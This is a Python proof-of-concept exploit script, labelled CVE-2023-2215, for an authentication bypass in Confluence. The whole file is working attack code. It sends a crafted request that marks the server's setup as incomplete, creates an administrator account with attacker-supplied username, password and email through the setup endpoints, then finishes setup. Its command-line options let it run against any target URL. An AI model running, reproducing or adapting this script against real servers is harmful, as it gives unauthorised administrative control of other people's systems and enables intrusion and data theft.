import aiohttp
import asyncio
import argparse

"""
poc-2023-2215.py - PoC for CVE-2023-2215 - Confluence auth bypass
"""

async def set_setup_incomplete(base_url, headers):
    url = f"{base_url}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                print("Setup marked as incomplete")
            else:
                print(f"Failed to set up as incomplete. Status code: {response.status}")

async def setup_administrator(base_url, headers, username, password, email):
    url = f"{base_url}/setup/setupadministrator.action"
    data = {
        'username': username,
        'fullName': username,
        'email': email,
        'password': password,
        'confirm': password,
        'setup-next-button': 'Next'
    }
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=data, headers=headers) as response:
            if response.status == 200:
                print("Administrator setup successful")
            else:
                print(f"Administrator setup failed. Status code: {response.status}")

async def finish_setup(base_url, headers):
    url = f"{base_url}/setup/finishsetup.action"
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers) as response:
            if response.status == 200:
                print("Setup finished")
            else:
                print(f"Failed to Exploit. Status code: {response.status}")

async def main():
    parser = argparse.ArgumentParser(description='CVE-2023-2215 Exploit')
    parser.add_argument('--url', required=True, help='Confluence base URL')
    parser.add_argument('--username', required=True, help='Admin username')
    parser.add_argument('--password', required=True, help='Admin password')
    parser.add_argument('--email', required=True, help='Admin email')
    args = parser.parse_args()

    base_url = args.url
    username = args.username
    password = args.password
    email = args.email

    headers = {
        "X-Atlassian-Token": "no-check",
    }

    print("Starting the setup process...")
    await set_setup_incomplete(base_url, headers)
    await setup_administrator(base_url, headers, username, password, email)
    await finish_setup(base_url, headers)
    print("Setup process completed.")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
